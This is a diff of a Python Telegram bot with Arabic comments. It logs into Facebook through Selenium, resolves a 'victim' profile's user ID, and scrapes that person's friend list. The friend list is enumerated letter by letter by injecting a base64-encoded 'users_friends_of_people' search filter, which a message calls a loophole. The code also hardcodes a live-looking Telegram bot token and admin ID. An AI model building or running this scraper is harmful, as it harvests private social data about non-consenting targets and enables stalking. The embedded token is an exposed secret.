@@ -11,7 +11,7 @@ from selenium.webdriver.support.wait import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
 
-# --- 1. إعدادات البوت ---
+# --- 1. إعدادات البوت والتحكم ---
 BOT_TOKEN = '8345512854:AAGTrsdBKd90oxhBK83ZkFVSR0qh52ZYDto' 
 ADMIN_ID = '7825994636' 
 
@@ -19,7 +19,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 user_data = {}
 
-# --- 2. إعدادات الكروم ---
+# --- 2. إعدادات المتصفح لبيئة Render ---
 def get_chrome_options():
     chrome_options = webdriver.ChromeOptions()
     chrome_options.binary_location = os.environ.get("CHROME_BIN")
@@ -28,178 +28,169 @@ def get_chrome_options():
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-notifications")
     chrome_options.add_argument("--window-size=1366,768")
+    chrome_options.add_argument("--disable-gpu")
     return chrome_options
 
-# --- 3. دالة مساعدة لإرسال لقطة شاشة ---
-def send_screenshot(driver, chat_id, caption=""):
+# --- 3. دوال مساعدة للإرسال ---
+def send_live_shot(driver, chat_id, caption):
     try:
-        filename = f"shot_{chat_id}_{int(time.time())}.png"
-        driver.save_screenshot(filename)
-        with open(filename, 'rb') as photo:
+        tmp_name = f"live_{int(time.time())}.png"
+        driver.save_screenshot(tmp_name)
+        with open(tmp_name, 'rb') as photo:
             bot.send_photo(chat_id, photo, caption=caption)
-        os.remove(filename) # حذف الصورة بعد الإرسال لتوفير المساحة
-    except Exception as e:
-        print(f"Failed to send screenshot: {e}")
+        os.remove(tmp_name)
+    except:
+        pass
 
-# --- 4. السيرفر الوهمي ---
+def screenshot_timer_worker(driver, chat_id, stop_event):
+    """خيط يعمل في الخلفية لإرسال صورة كل دقيقتين"""
+    while not stop_event.is_set():
+        time.sleep(120) # انتظر دقيقتين
+        if stop_event.is_set(): break
+        send_live_shot(driver, chat_id, "⏰ تحديث تلقائي (كل دقيقتين): هذه حالة المتصفح الآن.")
+
+# --- 4. السيرفر الوهمي (Keep Alive) ---
 @app.route('/')
-def home():
-    return "Bot is running..."
+def home(): return "Bot is Active"
 
 def run_flask():
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
 
-# --- 5. وظيفة السحب (الرئيسية) ---
+# --- 5. وظيفة السحب المباشر والمطورة ---
 def start_scraping_process(chat_id, email, password, target_url):
     driver = None
+    stop_event = threading.Event()
     try:
-        bot.send_message(chat_id, "⚙️ جاري تشغيل المتصفح...")
+        bot.send_message(chat_id, "⚙️ جاري بدء المحرك... سأرسل لك صوراً دورية.")
         driver = webdriver.Chrome(options=get_chrome_options())
         
-        # 1. تسجيل الدخول
+        # تشغيل مؤقت الصور في خيط منفصل
+        timer_thread = threading.Thread(target=screenshot_timer_worker, args=(driver, chat_id, stop_event))
+        timer_thread.start()
+
+        # الخطوة 1: تسجيل الدخول
         driver.get('https://facebook.com')
-        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'email')))
-        
+        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, 'email')))
         driver.find_element(By.ID, 'email').send_keys(email)
         driver.find_element(By.ID, 'pass').send_keys(password)
         driver.find_element(By.NAME, 'login').click()
         
-        bot.send_message(chat_id, "جاري التحقق من الدخول...")
-        time.sleep(5)
+        time.sleep(7)
+        send_live_shot(driver, chat_id, "📸 الحالة بعد محاولة الدخول")
 
-        # 📸 لقطة شاشة بعد محاولة الدخول
-        send_screenshot(driver, chat_id, "📸 حالة المتصفح بعد تسجيل الدخول")
-
-        if "login_attempt" in driver.current_url or "checkpoint" in driver.current_url:
-             bot.send_message(chat_id, "❌ فشل الدخول. (انظر للصورة أعلاه للتأكد).")
-             driver.quit()
-             return
-
-        bot.send_message(chat_id, "✅ تم الدخول! جاري الذهاب للهدف...")
-        driver.get(target_url)
-        time.sleep(5)
-
-        # 📸 لقطة شاشة عند فتح بروفايل الضحية
-        send_screenshot(driver, chat_id, "📸 أنا الآن في صفحة الهدف")
-
-        # استخراج المعرف
-        TARGET_UID = None
-        try:
-            links = driver.find_elements(By.TAG_NAME, 'a')
-            for link in links:
-                href = str(link.get_attribute('href'))
-                if 'friendship' in href or 'pb_friends_tl' in href:
-                    match = re.search(r'/(\d+)/', href)
-                    if not match: match = re.search(r'id=(\d+)', href)
-                    if match:
-                        TARGET_UID = match.group(1)
-                        break
-            
-            if not TARGET_UID:
-                match = re.search(r'"userID":"(\d+)"', driver.page_source)
-                if match: TARGET_UID = match.group(1)
-            
-            if not TARGET_UID:
-                # محاولة استخراج من الرابط المباشر
-                match = re.search(r'id=(\d+)', target_url)
-                if match: TARGET_UID = match.group(1)
-
-        except Exception as e:
-            print(f"Error finding UID: {e}")
-
-        if not TARGET_UID:
-            bot.send_message(chat_id, "❌ لم أجد ID الحساب. هل الرابط صحيح؟")
+        if "checkpoint" in driver.current_url or "login_attempt" in driver.current_url:
+            bot.send_message(chat_id, "❌ فشل الدخول (تأكد من الحساب أو الأمان).")
+            stop_event.set()
             driver.quit()
             return
 
-        bot.send_message(chat_id, f"🆔 ID: {TARGET_UID}. جاري بدء البحث...")
+        # الخطوة 2: استخراج الـ ID المطور
+        bot.send_message(chat_id, "✅ تم الدخول. جاري جلب ID الضحية...")
+        driver.get(target_url)
+        time.sleep(5)
+        
+        page_source = driver.page_source
+        TARGET_UID = None
+        
+        # البحث عن ID في روابط الصفحة أو الكود المصدري
+        patterns = [r'"userID":"(\d+)"', r'"delegate_page_id":"(\d+)"', r'id=(\d+)', r'php\?id=(\d+)']
+        for p in patterns:
+            match = re.search(p, page_source if '"' in p else target_url)
+            if match:
+                TARGET_UID = match.group(1)
+                break
+        
+        if not TARGET_UID:
+            # محاولة أخيرة من الروابط الظاهرة
+            links = driver.find_elements(By.TAG_NAME, 'a')
+            for l in links:
+                h = str(l.get_attribute('href'))
+                if 'friendship' in h:
+                    m = re.search(r'/(\d+)/', h)
+                    if m: TARGET_UID = m.group(1); break
 
+        if not TARGET_UID:
+            bot.send_message(chat_id, "❌ تعذر استخراج الـ ID. تأكد من الرابط.")
+            stop_event.set()
+            driver.quit()
+            return
+
+        bot.send_message(chat_id, f"🆔 المعرف: {TARGET_UID}\n⏳ بدأت عملية السحب (A-Z).")
+
+        # الخطوة 3: السحب بالحروف
         payload = '{"friends:0":"{\\"name\\":\\"users_friends_of_people\\",\\"args\\":\\"%s\\"}"}' % TARGET_UID.strip()
         encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
+        
+        friends_list = []
 
-        friends = []
-        def check_new(last): return len(driver.find_elements(By.XPATH, "//a[contains(@href, 'facebook.com')]")) > last
-
-        # حلقة البحث (A to Z)
-        for i, code in enumerate(range(97, 123)):
-            char = chr(code)
-            search_url = f"https://www.facebook.com/search/people/?q={char}&filters={encoded_payload}"
-            driver.get(search_url)
+        for i, char_code in enumerate(range(97, 123)):
+            char = chr(char_code)
+            driver.get(f"https://www.facebook.com/search/people/?q={char}&filters={encoded_payload}")
+            time.sleep(3)
             
-            # 📸 لقطة شاشة كل 3 حروف لطمأنة المستخدم
-            if i % 3 == 0:
-                send_screenshot(driver, chat_id, f"📸 أبحث الآن في حرف '{char}'... (النتائج الظاهرة)")
-
-            last = 0
-            for _ in range(3):
+            # تمرير الصفحة
+            for _ in range(2):
                 driver.find_element(By.TAG_NAME, "body").send_keys(Keys.END)
                 time.sleep(2)
-                if check_new(last): 
-                    last = len(driver.find_elements(By.XPATH, "//a[contains(@href, 'facebook.com')]"))
-                else: break
             
             elements = driver.find_elements(By.XPATH, "//a[contains(@href, 'facebook.com')]")
             for el in elements:
                 try:
                     href = el.get_attribute('href')
-                    if 'facebook.com' in href and 'sk=friends' not in href and 'login' not in href:
-                         link = href.split('?')[0]
-                         if link not in friends:
-                             friends.append(link)
-                except: pass
+                    if 'facebook.com' in href and 'login' not in href and 'search' not in href:
+                        clean = href.split('?')[0].split('&')[0]
+                        if clean not in friends_list: friends_list.append(clean)
+                except: continue
             
-            if i % 5 == 0: bot.send_message(chat_id, f"✅ تم الانتهاء من حرف {char}...")
+            if i % 5 == 0: bot.send_message(chat_id, f"✅ تم فحص حرف {char}...")
 
-        unique = list(set(friends))
-        if not unique:
-            # صورة نهائية ليرى المستخدم لماذا لا توجد نتائج
-            send_screenshot(driver, chat_id, "📸 صورة نهائية للبحث (لم يتم العثور على نتائج)")
-            bot.send_message(chat_id, "⚠️ انتهى البحث ولم أجد نتائج.")
+        # النهاية
+        stop_event.set() # إيقاف مؤقت الصور
+        if friends_list:
+            fname = f"result_{TARGET_UID}.txt"
+            with open(fname, 'w') as f:
+                for line in set(friends_list): f.write(f"{line}\n")
+            with open(fname, 'rb') as doc:
+                bot.send_document(chat_id, doc, caption=f"🎉 اكتمل السحب!\nالعدد المستخرج: {len(set(friends_list))}")
+            os.remove(fname)
         else:
-            with open(f"{TARGET_UID}.txt", 'w') as f:
-                for line in unique: f.write(f"{line}\n")
-            with open(f"{TARGET_UID}.txt", 'rb') as f:
-                bot.send_document(chat_id, f, caption=f"🎉 تمت المهمة!\nالعدد: {len(unique)}")
-            os.remove(f"{TARGET_UID}.txt")
+            bot.send_message(chat_id, "⚠️ لم يتم العثور على نتائج (ربما الثغرة مغلقة لهذا الحساب).")
 
     except Exception as e:
-        bot.send_message(chat_id, f"❌ خطأ: {e}")
-        try:
-            # محاولة إرسال صورة عند حدوث خطأ
-            send_screenshot(driver, chat_id, "📸 لقطة الشاشة عند حدوث الخطأ")
-        except: pass
+        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
     finally:
+        stop_event.set()
         if driver: driver.quit()
 
-# --- 6. خطوات المحادثة ---
+# --- 6. تسلسل أوامر البوت ---
 
 @bot.message_handler(commands=['start'])
-def step_1_welcome(message):
+def handle_start(message):
+    if str(message.chat.id) != ADMIN_ID: return
     user_data[message.chat.id] = {}
-    msg = bot.send_message(message.chat.id, "1️⃣ أرسل الإيميل:")
-    bot.register_next_step_handler(msg, step_2_email)
+    m = bot.send_message(message.chat.id, "1️⃣ أرسل الإيميل:")
+    bot.register_next_step_handler(m, get_mail)
 
-def step_2_email(message):
+def get_mail(message):
     user_data[message.chat.id]['email'] = message.text
-    msg = bot.send_message(message.chat.id, "2️⃣ أرسل الباسورد:")
-    bot.register_next_step_handler(msg, step_3_password)
+    m = bot.send_message(message.chat.id, "2️⃣ أرسل الباسورد:")
+    bot.register_next_step_handler(m, get_pass)
 
-def step_3_password(message):
+def get_pass(message):
     user_data[message.chat.id]['password'] = message.text
-    msg = bot.send_message(message.chat.id, "✅ تم الحفظ.\n3️⃣ الآن أرسل رابط الحساب الهدف:")
-    bot.register_next_step_handler(msg, step_4_target)
+    # لن نحذف الرسالة لضمان عدم التعليق
+    m = bot.send_message(message.chat.id, "3️⃣ أرسل رابط حساب الهدف:")
+    bot.register_next_step_handler(m, get_target)
 
-def step_4_target(message):
-    target_url = message.text
-    chat_id = message.chat.id
-    email = user_data[chat_id].get('email')
-    password = user_data[chat_id].get('password')
-    
-    bot.send_message(chat_id, "🚀 سأبدأ الآن بإرسال صور لك لترى ماذا يحدث...")
-    threading.Thread(target=start_scraping_process, args=(chat_id, email, password, target_url)).start()
+def get_target(message):
+    cid = message.chat.id
+    target = message.text
+    email = user_data[cid].get('email')
+    password = user_data[cid].get('password')
+    bot.send_message(cid, "🚀 انطلقنا! سأرسل لك تحديثاً بالصور كل دقيقتين.")
+    threading.Thread(target=start_scraping_process, args=(cid, email, password, target)).start()
 
-# --- 7. التشغيل ---
 if __name__ == "__main__":
     threading.Thread(target=run_flask).start()
     bot.infinity_polling()
